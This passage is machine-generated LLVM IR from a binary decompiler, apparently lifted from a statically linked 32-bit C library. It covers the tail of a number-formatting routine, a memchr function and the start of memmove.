  %v1_80558af = icmp eq i1 %v5_80558ab, false
  br i1 %v1_80558af, label %dec_label_pc_80558c0, label %dec_label_pc_80558b1

dec_label_pc_80558b1:                             ; preds = %dec_label_pc_80558a4
  %v1_80558b1 = icmp eq i32 %v0_80558b1, 0
  %v1_80558b3 = icmp eq i1 %v1_80558b1, false
  br i1 %v1_80558b3, label %dec_label_pc_80558c0, label %dec_label_pc_80558b5

dec_label_pc_80558b5:                             ; preds = %dec_label_pc_80558b1
  br i1 %v12_8055719, label %dec_label_pc_80558d7, label %dec_label_pc_80558bc

dec_label_pc_80558bc:                             ; preds = %dec_label_pc_80558b5
  %v0_80558bc = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_80558bc, 1
  br i1 %tmp140, label %dec_label_pc_80558d7, label %dec_label_pc_80558c0

dec_label_pc_80558c0:                             ; preds = %dec_label_pc_80558bc, %dec_label_pc_80558b1, %dec_label_pc_80558a4
  %v1_80558c0 = inttoptr i32 %v0_80558c0 to i32*
  store i32 112, i32* %v1_80558c0, align 4
  %v0_80558c6 = load i32, i32* @ecx, align 4
  %v1_80558c6 = add i32 %v0_80558c6, 4
  %v2_80558c6 = inttoptr i32 %v1_80558c6 to i32*
  store i32 1, i32* %v2_80558c6, align 4
  %v0_80558cd = load i32, i32* @ecx, align 4
  %v1_80558cd = add i32 %v0_80558cd, 8
  %v2_80558cd = inttoptr i32 %v1_80558cd to i32*
  store i32 ptrtoint (i32* @global_var_805c840.579 to i32), i32* %v2_80558cd, align 4
  %v0_80558d4 = load i32, i32* @ecx, align 4
  %v1_80558d4 = add i32 %v0_80558d4, 12
  store i32 %v1_80558d4, i32* @ecx, align 4
  %v0_80558d7.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80558d7

dec_label_pc_80558d7:                             ; preds = %dec_label_pc_80558bc, %dec_label_pc_80558b5, %dec_label_pc_80558c0
  %v0_80558dc = phi i32 [ %v0_80558c0, %dec_label_pc_80558bc ], [ %v0_80558c0, %dec_label_pc_80558b5 ], [ %v1_80558d4, %dec_label_pc_80558c0 ]
  %v0_80558d7 = phi i32 [ %v0_80558d772, %dec_label_pc_80558bc ], [ %v0_80558d772, %dec_label_pc_80558b5 ], [ %v0_80558d7.pre, %dec_label_pc_80558c0 ]
  %v1_80558d7 = add i32 %v0_80558d7, 1
  %v8_80558d7 = icmp eq i32 %v1_80558d7, 0
  store i32 %v1_80558d7, i32* %ebx.global-to-local, align 4
  br i1 %v8_80558d7, label %dec_label_pc_80558f1, label %dec_label_pc_80558da

dec_label_pc_80558da:                             ; preds = %dec_label_pc_80558d7
  store i32 %v1_80558d7, i32* %eax.global-to-local, align 4
  %v1_80558dc = inttoptr i32 %v0_80558dc to i32*
  store i32 176, i32* %v1_80558dc, align 4
  %v0_80558e2 = load i32, i32* %eax.global-to-local, align 4
  %v1_80558e2 = sub i32 0, %v0_80558e2
  store i32 %v1_80558e2, i32* %eax.global-to-local, align 4
  %v1_80558e4 = load i32, i32* @ecx, align 4
  %v2_80558e4 = add i32 %v1_80558e4, 4
  %v3_80558e4 = inttoptr i32 %v2_80558e4 to i32*
  store i32 %v1_80558e2, i32* %v3_80558e4, align 4
  %v0_80558e7 = load i32, i32* @ecx, align 4
  %v1_80558e7 = add i32 %v0_80558e7, 8
  %v2_80558e7 = inttoptr i32 %v1_80558e7 to i32*
  store i32 ptrtoint (i32* @global_var_805c833.578 to i32), i32* %v2_80558e7, align 4
  %v0_80558ee = load i32, i32* @ecx, align 4
  %v1_80558ee = add i32 %v0_80558ee, 12
  store i32 %v1_80558ee, i32* @ecx, align 4
  br label %dec_label_pc_80558f1

dec_label_pc_80558f1:                             ; preds = %dec_label_pc_80558d7, %dec_label_pc_80558da
  %v0_80558f5 = phi i32 [ %v0_80558dc, %dec_label_pc_80558d7 ], [ %v1_80558ee, %dec_label_pc_80558da ]
  %v0_80558f1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80558f1 = icmp eq i32 %v0_80558f1, 0
  br i1 %v1_80558f1, label %dec_label_pc_8055904, label %dec_label_pc_80558f5

dec_label_pc_80558f5:                             ; preds = %dec_label_pc_80558f1
  %v1_80558f5 = inttoptr i32 %v0_80558f5 to i32*
  store i32 112, i32* %v1_80558f5, align 4
  %v0_80558fb = load i32, i32* %edx.global-to-local, align 4
  %v1_80558fb = load i32, i32* @ecx, align 4
  %v2_80558fb = add i32 %v1_80558fb, 4
  %v3_80558fb = inttoptr i32 %v2_80558fb to i32*
  store i32 %v0_80558fb, i32* %v3_80558fb, align 4
  %v0_80558fe = load i32, i32* %edi.global-to-local, align 4
  %v1_80558fe = load i32, i32* @ecx, align 4
  %v2_80558fe = add i32 %v1_80558fe, 8
  %v3_80558fe = inttoptr i32 %v2_80558fe to i32*
  store i32 %v0_80558fe, i32* %v3_80558fe, align 4
  %v0_8055901 = load i32, i32* @ecx, align 4
  %v1_8055901 = add i32 %v0_8055901, 12
  store i32 %v1_8055901, i32* @ecx, align 4
  br label %dec_label_pc_8055904

dec_label_pc_8055904:                             ; preds = %dec_label_pc_80558f1, %dec_label_pc_80558f5
  %v0_8055922 = phi i32 [ %v0_80558f5, %dec_label_pc_80558f1 ], [ %v1_8055901, %dec_label_pc_80558f5 ]
  br i1 %v1_805571e, label %dec_label_pc_8055918, label %dec_label_pc_805590b

dec_label_pc_805590b:                             ; preds = %dec_label_pc_8055904
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v3_8055912 = load i8, i8* %v2_80558ab, align 1
  %v4_8055912 = and i8 %v3_8055912, 16
  %v5_8055912 = icmp eq i8 %v4_8055912, 0
  br i1 %v5_8055912, label %dec_label_pc_8055935, label %dec_label_pc_8055918

dec_label_pc_8055918:                             ; preds = %dec_label_pc_805590b, %dec_label_pc_8055904
  %v0_8055918 = load i32, i32* %edx.global-to-local, align 4
  %v1_805591a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805591a = sub i32 %v0_8055918, %v1_805591a
  store i32 %v2_805591a, i32* %eax.global-to-local, align 4
  %v1_805591c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805591c = sub i32 %v2_805591a, %v1_805591c
  %v8_805591c = xor i32 %v1_805591c, %v2_805591a
  %v9_805591c = xor i32 %v2_805591c, %v2_805591a
  %v10_805591c = and i32 %v9_805591c, %v8_805591c
  %v11_805591c = icmp slt i32 %v10_805591c, 0
  %v13_805591c = icmp slt i32 %v2_805591c, 0
  %v2_805591e = icmp eq i1 %v13_805591c, %v11_805591c
  br i1 %v2_805591e, label %dec_label_pc_8055935, label %dec_label_pc_8055920

dec_label_pc_8055920:                             ; preds = %dec_label_pc_8055918
  %v2_8055920 = sub i32 %v1_805591c, %v2_805591a
  store i32 %v2_8055920, i32* %ebp.global-to-local, align 4
  %v1_8055922 = inttoptr i32 %v0_8055922 to i32*
  store i32 176, i32* %v1_8055922, align 4
  %v0_8055928 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055928 = load i32, i32* @ecx, align 4
  %v2_8055928 = add i32 %v1_8055928, 4
  %v3_8055928 = inttoptr i32 %v2_8055928 to i32*
  store i32 %v0_8055928, i32* %v3_8055928, align 4
  %v0_805592b = load i32, i32* @ecx, align 4
  %v1_805592b = add i32 %v0_805592b, 8
  %v2_805592b = inttoptr i32 %v1_805592b to i32*
  store i32 ptrtoint (i32* @global_var_805c833.578 to i32), i32* %v2_805592b, align 4
  %v0_8055932 = load i32, i32* @ecx, align 4
  %v1_8055932 = add i32 %v0_8055932, 12
  store i32 %v1_8055932, i32* @ecx, align 4
  br label %dec_label_pc_8055935

dec_label_pc_8055935:                             ; preds = %dec_label_pc_8055918, %dec_label_pc_805590b, %dec_label_pc_8055920
  %v1_80559b884 = phi i32 [ %v0_8055922, %dec_label_pc_8055918 ], [ %v0_8055922, %dec_label_pc_805590b ], [ %v1_8055932, %dec_label_pc_8055920 ]
  %v12_8055935 = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_8055935, label %dec_label_pc_80559ab, label %dec_label_pc_805593c

dec_label_pc_805593c:                             ; preds = %dec_label_pc_8055935
  %v0_8055943 = load i32, i32* %esi.global-to-local, align 4
  %v2_8055943 = icmp slt i32 %v0_8055943, 0
  %v1_8055945 = trunc i32 %stack_var_-42.0 to i8
  store i32 %v0_8055943, i32* %edx.global-to-local, align 4
  br i1 %v2_8055943, label %dec_label_pc_8055954, label %dec_label_pc_805594b

dec_label_pc_805594b:                             ; preds = %dec_label_pc_805593c
  store i32 43, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805595d

dec_label_pc_8055954:                             ; preds = %dec_label_pc_805593c
  store i32 45, i32* %edi.global-to-local, align 4
  %v1_805595b = sub i32 0, %v0_8055943
  store i32 %v1_805595b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805595d

dec_label_pc_805595d:                             ; preds = %dec_label_pc_805594b, %dec_label_pc_8055954
  %v0_805597177 = phi i32 [ %v0_8055943, %dec_label_pc_805594b ], [ %v1_805595b, %dec_label_pc_8055954 ]
  store i32 0, i32* %stack_var_-27, align 4
  %v2_8055965 = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_8055965, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055971

dec_label_pc_8055971:                             ; preds = %dec_label_pc_8055971.backedge, %dec_label_pc_805595d
  %v0_805597f = phi i32 [ %v0_8055982, %dec_label_pc_8055971.backedge ], [ 2, %dec_label_pc_805595d ]
  %v0_805597b = phi i32 [ %v0_805597b.pre, %dec_label_pc_8055971.backedge ], [ %v2_8055965, %dec_label_pc_805595d ]
  %v0_8055971 = phi i32 [ %v9_8055979, %dec_label_pc_8055971.backedge ], [ %v0_805597177, %dec_label_pc_805595d ]
  store i32 10, i32* %ebp.global-to-local, align 4
  %v1_8055978 = ashr i32 %v0_8055971, 31
  %v2_8055979 = zext i32 %v0_8055971 to i64
  %v4_8055979 = zext i32 %v1_8055978 to i64
  %v5_8055979 = mul nuw i64 %v4_8055979, 4294967296
  %v6_8055979 = or i64 %v5_8055979, %v2_8055979
  %v8_8055979 = sdiv i64 %v6_8055979, 10
  %v9_8055979 = trunc i64 %v8_8055979 to i32
  store i32 %v9_8055979, i32* %eax.global-to-local, align 4
  %v11_8055979 = srem i64 %v6_8055979, 10
  %v12_8055979 = trunc i64 %v11_8055979 to i8
  %v1_805597b = add i32 %v0_805597b, -1
  store i32 %v1_805597b, i32* %ebx.global-to-local, align 4
  %v1_805597c = add i8 %v12_8055979, 48
  %v1_805597f = add i32 %v0_805597f, 1
  store i32 %v1_805597f, i32* %esi.global-to-local, align 4
  %v3_8055980 = inttoptr i32 %v1_805597b to i8*
  store i8 %v1_805597c, i8* %v3_8055980, align 1
  %v0_8055982 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v9_8055979, i32* %edx.global-to-local, align 4
  %v7_8055987 = icmp sgt i32 %v0_8055982, 3
  br i1 %v7_8055987, label %dec_label_pc_8055989, label %dec_label_pc_8055971.backedge

dec_label_pc_8055989:                             ; preds = %dec_label_pc_8055971
  %v2_8055989 = icmp eq i32 %v9_8055979, 0
  %v1_805598b = icmp eq i1 %v2_8055989, false
  br i1 %v1_805598b, label %dec_label_pc_8055971.backedge, label %dec_label_pc_805598d

dec_label_pc_8055971.backedge:                    ; preds = %dec_label_pc_8055989, %dec_label_pc_8055971
  %v0_805597b.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055971

dec_label_pc_805598d:                             ; preds = %dec_label_pc_8055989
  %v0_805598d = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805598d, i32* %edx.global-to-local, align 4
  %v0_805598f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805598f = add i32 %v0_805598f, -2
  store i32 %v1_805598f, i32* %eax.global-to-local, align 4
  %v1_8055992 = trunc i32 %v0_805598d to i8
  %v3_8055992 = add i32 %v0_805598f, -1
  %v4_8055992 = inttoptr i32 %v3_8055992 to i8*
  store i8 %v1_8055992, i8* %v4_8055992, align 1
  %v5_8055995 = load i32, i32* %edx.global-to-local, align 4
  %v6_8055995 = and i32 %v5_8055995, -256
  %v7_8055995 = or i32 %v6_8055995, %stack_var_-42.0
  store i32 %v7_8055995, i32* %edx.global-to-local, align 4
  %v2_8055999 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8055999 = add i32 %v2_8055999, -2
  %v4_8055999 = inttoptr i32 %v3_8055999 to i8*
  store i8 %v1_8055945, i8* %v4_8055999, align 1
  %v0_805599c = load i32, i32* @ecx, align 4
  %v1_805599c = inttoptr i32 %v0_805599c to i32*
  store i32 112, i32* %v1_805599c, align 4
  %v0_80559a2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80559a2 = load i32, i32* @ecx, align 4
  %v2_80559a2 = add i32 %v1_80559a2, 4
  %v3_80559a2 = inttoptr i32 %v2_80559a2 to i32*
  store i32 %v0_80559a2, i32* %v3_80559a2, align 4
  %v0_80559a5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80559a5 = load i32, i32* @ecx, align 4
  %v2_80559a5 = add i32 %v1_80559a5, 8
  %v3_80559a5 = inttoptr i32 %v2_80559a5 to i32*
  store i32 %v0_80559a5, i32* %v3_80559a5, align 4
  %v0_80559a8 = load i32, i32* @ecx, align 4
  %v1_80559a8 = add i32 %v0_80559a8, 12
  store i32 %v1_80559a8, i32* @ecx, align 4
  br label %dec_label_pc_80559ab

dec_label_pc_80559ab:                             ; preds = %dec_label_pc_8055935, %dec_label_pc_80555d0, %dec_label_pc_805598d
  %v0_8055a2c = phi i32 [ %v1_80559b884, %dec_label_pc_8055935 ], [ %v2_80555d8, %dec_label_pc_80555d0 ], [ %v1_80559a8, %dec_label_pc_805598d ]
  %v2_80559ab = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80559ab, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80559af

dec_label_pc_80559af:                             ; preds = %dec_label_pc_80559af, %dec_label_pc_80559ab
  %v0_80559af = phi i32 [ %v2_80559ab, %dec_label_pc_80559ab ], [ %v1_80559b1, %dec_label_pc_80559af ]
  %stack_var_-216.0 = phi i32 [ %v3_80554c3, %dec_label_pc_80559ab ], [ %v5_80559b4, %dec_label_pc_80559af ]
  %v1_80559af = inttoptr i32 %v0_80559af to i32*
  %v2_80559af = load i32, i32* %v1_80559af, align 4
  store i32 %v2_80559af, i32* %edx.global-to-local, align 4
  %v1_80559b1 = add i32 %v0_80559af, 12
  store i32 %v1_80559b1, i32* %eax.global-to-local, align 4
  %v5_80559b4 = sub i32 %stack_var_-216.0, %v2_80559af
  %v7_80559b8 = icmp ult i32 %v1_80559b1, %v0_8055a2c
  br i1 %v7_80559b8, label %dec_label_pc_80559af, label %dec_label_pc_80559bc

dec_label_pc_80559bc:                             ; preds = %dec_label_pc_80559af
  %v5_80559c5 = icmp eq i8 %stack_var_-26.0, 0
  %v1_80559d5 = icmp eq i1 %v5_80559c5, false
  %v2_80559d5 = zext i1 %v1_80559d5 to i32
  %v2_80559d8 = sub i32 %v5_80559b4, %v2_80559d5
  store i32 %v2_80559d8, i32* %edx.global-to-local, align 4
  store i32 160, i32* %stack_var_-168, align 4
  store i32 %v2_80559d8, i32* %eax.global-to-local, align 4
  store i32 %v0_8055a2c, i32* %esi.global-to-local, align 4
  %tmp141 = icmp slt i32 %v2_80559d8, 1
  br i1 %tmp141, label %dec_label_pc_8055a2e, label %dec_label_pc_80559ee

dec_label_pc_80559ee:                             ; preds = %dec_label_pc_80559bc
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v2_80559f5 = inttoptr i32 %v1_8055503 to i8*
  %v3_80559f5 = load i8, i8* %v2_80559f5, align 1
  %v4_80559f5 = and i8 %v3_80559f5, 8
  %v5_80559f5 = icmp eq i8 %v4_80559f5, 0
  br i1 %v5_80559f5, label %dec_label_pc_8055a10, label %dec_label_pc_80559fb

dec_label_pc_80559fb:                             ; preds = %dec_label_pc_80559ee
  %v1_80559fb = add i32 %v0_8055a2c, 12
  store i32 %v1_80559fb, i32* %esi.global-to-local, align 4
  %v1_80559fe = inttoptr i32 %v0_8055a2c to i32*
  store i32 160, i32* %v1_80559fe, align 4
  %v0_8055a04 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055a04 = load i32, i32* @ecx, align 4
  %v2_8055a04 = add i32 %v1_8055a04, 4
  %v3_8055a04 = inttoptr i32 %v2_8055a04 to i32*
  store i32 %v0_8055a04, i32* %v3_8055a04, align 4
  %v0_8055a07 = load i32, i32* @ecx, align 4
  %v1_8055a07 = add i32 %v0_8055a07, 8
  %v2_8055a07 = inttoptr i32 %v1_8055a07 to i32*
  store i32 ptrtoint (i32* @global_var_805c833.578 to i32), i32* %v2_8055a07, align 4
  br label %dec_label_pc_8055a2e

dec_label_pc_8055a10:                             ; preds = %dec_label_pc_80559ee
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_8055a17 = add i32 %tmp112, 16
  %v2_8055a17 = inttoptr i32 %v1_8055a17 to i32*
  %v3_8055a17 = load i32, i32* %v2_8055a17, align 4
  %v9_8055a17 = icmp eq i32 %v3_8055a17, 48
  %v1_8055a1b = icmp eq i1 %v9_8055a17, false
  br i1 %v1_8055a1b, label %dec_label_pc_8055a28, label %dec_label_pc_8055a1d

dec_label_pc_8055a1d:                             ; preds = %dec_label_pc_8055a10
  %v3_8055a1d = load i32, i32* %stack_var_-152, align 4
  %v5_8055a1d = add i32 %v3_8055a1d, %v2_80559d8
  store i32 %v5_8055a1d, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8055a2c

dec_label_pc_8055a23:                             ; preds = %dec_label_pc_8055a34
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055a5b

dec_label_pc_8055a28:                             ; preds = %dec_label_pc_8055a10
  br label %dec_label_pc_8055a2c

dec_label_pc_8055a2c:                             ; preds = %dec_label_pc_8055a1d, %dec_label_pc_8055a28
  store i32 %v0_8055a2c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8055a2e

dec_label_pc_8055a2e:                             ; preds = %dec_label_pc_80559bc, %dec_label_pc_80559fb, %dec_label_pc_8055a2c
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8055a30 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8055a30, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055a34

dec_label_pc_8055a34:                             ; preds = %dec_label_pc_8055a52, %dec_label_pc_8055a2e
  call void @__pseudo_call(i32 %tmp112)
  %v0_8055a4d = load i32, i32* %eax.global-to-local, align 4
  %v1_8055a4d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055a4d = add i32 %v1_8055a4d, 4
  %v3_8055a4d = inttoptr i32 %v2_8055a4d to i32*
  %v4_8055a4d = load i32, i32* %v3_8055a4d, align 4
  %v15_8055a4d = icmp eq i32 %v0_8055a4d, %v4_8055a4d
  %v1_8055a50 = icmp eq i1 %v15_8055a4d, false
  br i1 %v1_8055a50, label %dec_label_pc_8055a23, label %dec_label_pc_8055a52

dec_label_pc_8055a52:                             ; preds = %dec_label_pc_8055a34
  %v1_8055a52 = add i32 %v1_8055a4d, 12
  store i32 %v1_8055a52, i32* %ebx.global-to-local, align 4
  %v0_8055a55 = load i32, i32* %edi.global-to-local, align 4
  %v2_8055a55 = add i32 %v0_8055a55, %v0_8055a4d
  store i32 %v2_8055a55, i32* %edi.global-to-local, align 4
  %v1_8055a57 = load i32, i32* %esi.global-to-local, align 4
  %v7_8055a57 = icmp ult i32 %v1_8055a52, %v1_8055a57
  br i1 %v7_8055a57, label %dec_label_pc_8055a34, label %dec_label_pc_8055a5b

dec_label_pc_8055a5b:                             ; preds = %dec_label_pc_8055a52, %dec_label_pc_8055a23
  %v0_8055a61 = phi i32 [ -1, %dec_label_pc_8055a23 ], [ %v2_8055a55, %dec_label_pc_8055a52 ]
  store i32 %v0_8055a61, i32* %eax.global-to-local, align 4
  %v2_8055a64 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055a64, i32* @esi, align 4
  store i32 %v0_80554a6, i32* @edi, align 4
  store i32 %v0_80554a5, i32* @ebp, align 4
  ret i32 %v0_8055a61

; uselistorder directives
  uselistorder i32 %v0_8055a61, { 1, 0 }
  uselistorder i32 %v1_80559b1, { 1, 2, 0 }
  uselistorder i32 %v0_80559af, { 1, 0 }
  uselistorder i32 %v0_8055a2c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v0_8055982, { 1, 0 }
  uselistorder i32 %v9_8055979, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8055971, { 1, 0 }
  uselistorder i32 %v0_8055943, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805591c, { 1, 0 }
  uselistorder i32 %v1_805591c, { 1, 0, 2 }
  uselistorder i32 %v2_805591a, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8055850, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8055836, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_805589b, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v0_8055801, { 0, 2, 1 }
  uselistorder i32 %v1_80557da, { 1, 0 }
  uselistorder i32 %v0_80557d5, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80557a2, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_805579d, { 1, 0 }
  uselistorder i8 %v2_8055796, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8055796, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8055720, { 1, 2, 0 }
  uselistorder i8 %stack_var_-206.1, { 3, 1, 4, 0, 2 }
  uselistorder i8 %v4_8055705, { 1, 0 }
  uselistorder i32 %v1_80556f1, { 1, 0 }
  uselistorder i32 %v0_80556e5, { 1, 0 }
  uselistorder i32 %v4_80556cc, { 1, 0 }
  uselistorder i32 %tmp149, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80556d1, { 1, 0 }
  uselistorder i32 %v2_805568f, { 1, 0, 2 }
  uselistorder i3 %v1_8055545, { 1, 0 }
  uselistorder i8 %v4_80555c4, { 1, 0 }
  uselistorder i32 %v3_8055503, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v1_8055503, { 1, 0, 2 }
  uselistorder i8 %stack_var_-206.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i32 %v1_80554d5, { 1, 0 }
  uselistorder i32 %v3_80554c3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp112, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 0, 1, 2, 4, 3 }
  uselistorder x86_fp80* %st0.global-to-local, { 3, 1, 2, 0 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 1, 8, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 7, 8, 9, 10, 13, 12, 14, 11, 15, 4, 5, 6 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 9, 10, 11, 14, 15, 12, 13, 16, 20, 19, 21, 17, 18, 22, 25, 23, 26, 24, 27, 29, 28, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %ecx.global-to-local, { 3, 5, 4, 6, 7, 8, 9, 0, 1, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 10, 11, 9, 12, 13, 14, 15, 19, 16, 17, 0, 20, 21, 18, 23, 22, 24, 4, 5, 6, 7, 8 }
  uselistorder i32* %ebp.global-to-local, { 6, 7, 8, 9, 10, 11, 2, 4, 0, 3, 1, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 11, 12, 29, 30, 31, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i32 165, { 1, 0 }
  uselistorder i32 21, { 1, 2, 0 }
  uselistorder i8 102, { 4, 1, 0, 3, 2 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i32 69, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8055a2e, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055a2c, { 1, 0 }
  uselistorder label %dec_label_pc_80559ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805595d, { 1, 0 }
  uselistorder label %dec_label_pc_8055935, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055904, { 1, 0 }
  uselistorder label %dec_label_pc_80558f1, { 1, 0 }
  uselistorder label %dec_label_pc_80558d7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80558a4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805588f, { 1, 0 }
  uselistorder label %dec_label_pc_8055884, { 1, 0 }
  uselistorder label %dec_label_pc_805580b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80557fd, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80557c3, { 1, 0 }
  uselistorder label %dec_label_pc_8055793.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_805575f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805572e, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055719, { 1, 0 }
  uselistorder label %dec_label_pc_80555d0, { 1, 0 }
  uselistorder label %dec_label_pc_80554f4, { 1, 0 }
  uselistorder label %dec_label_pc_80554eb, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8055a68 = load i32, i32* @edi, align 4
  store i32 %v0_8055a68, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8055a6f = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055a6f, i32* %edi.global-to-local, align 4
  %v1_8055a77 = icmp eq i32 %arg3, 0
  store i1 %v1_8055a77, i1* %zf.global-to-local, align 1
  br i1 %v1_8055a77, label %dec_label_pc_8055a87, label %dec_label_pc_8055a7b

dec_label_pc_8055a7b:                             ; preds = %entry
  %v2_8055a7b = call i32 @_strlen(i8* %arg1)
  %v3_8055a7b = mul i32 %v2_8055a7b, -1
  %v4_8055a7b = add i32 %v3_8055a7b, -2
  store i32 %v4_8055a7b, i32* @ecx, align 4
  %v0_8055a7d = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8055a7d, label %dec_label_pc_8055a7b.dec_label_pc_8055a84_crit_edge, label %dec_label_pc_8055a7f

dec_label_pc_8055a7b.dec_label_pc_8055a84_crit_edge: ; preds = %dec_label_pc_8055a7b
  %v0_8055a84.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8055a84.pre, -1
  br label %dec_label_pc_8055a84

dec_label_pc_8055a7f:                             ; preds = %dec_label_pc_8055a7b
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8055a84

dec_label_pc_8055a84:                             ; preds = %dec_label_pc_8055a7b.dec_label_pc_8055a84_crit_edge, %dec_label_pc_8055a7f
  %v0_8055a84 = phi i32 [ %phitmp, %dec_label_pc_8055a7b.dec_label_pc_8055a84_crit_edge ], [ 0, %dec_label_pc_8055a7f ]
  %v8_8055a84 = icmp eq i32 %v0_8055a84, 0
  store i1 %v8_8055a84, i1* %zf.global-to-local, align 1
  store i32 %v0_8055a84, i32* %edi.global-to-local, align 4
  %v2_8055a89.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8055a87

dec_label_pc_8055a87:                             ; preds = %entry, %dec_label_pc_8055a84
  %v2_8055a89 = phi i32 [ %v0_8055a68, %entry ], [ %v2_8055a89.pre, %dec_label_pc_8055a84 ]
  %v0_8055a87 = phi i32 [ 0, %entry ], [ %v0_8055a84, %dec_label_pc_8055a84 ]
  store i32 %v2_8055a89, i32* @edi, align 4
  ret i32 %v0_8055a87

; uselistorder directives
  uselistorder i32 %v0_8055a84, { 2, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055a87, { 1, 0 }
  uselistorder label %dec_label_pc_8055a84, { 1, 0 }
}

define i32 @memmove(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8055a8d = load i32, i32* @esi, align 4
  store i32 %v0_8055a8d, i32* %stack_var_-8, align 4
  %v4_8055a8e = ptrtoint i8* %arg1 to i32
  %v9_8055a9a = icmp ugt i8* %tmp4, %arg1
  %v1_8055a9c = icmp eq i1 %v9_8055a9a, false
  br i1 %v1_8055a9c, label %dec_label_pc_8055aa4, label %dec_label_pc_8055a9e

dec_label_pc_8055a9e:                             ; preds = %entry
  %v7_8055aa0 = call i8* @_memcpy(i8* %arg1, i8* %tmp4, i32 %tmp)
  br label %dec_label_pc_8055ab0

dec_label_pc_8055aa4:                             ; preds = %entry
  %v3_8055aa4 = add i32 %arg2, -1
  %v4_8055aa4 = add i32 %v3_8055aa4, %tmp
